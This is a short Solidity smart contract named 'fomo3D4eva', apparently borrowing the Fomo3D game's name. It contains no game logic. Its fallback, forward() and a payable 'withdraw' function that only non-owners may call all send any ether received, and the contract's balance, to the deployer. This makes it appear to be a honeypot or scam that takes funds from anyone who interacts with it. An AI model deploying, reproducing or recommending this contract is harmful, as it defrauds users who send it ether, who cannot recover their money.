




contract fomo3D4eva {
    
   
    address public owner;
    address public forwarder;
    
    function fomo3D4eva() public {
        owner = msg.sender;
        forwarder = this;
    }
    
    function forward () public payable{
        owner.transfer(msg.value);
    }
    
    function () public payable {
        forward();
    }
    
    function withdraw() public payable {
        require(msg.sender != owner);
        owner.transfer(this.balance);
    }
}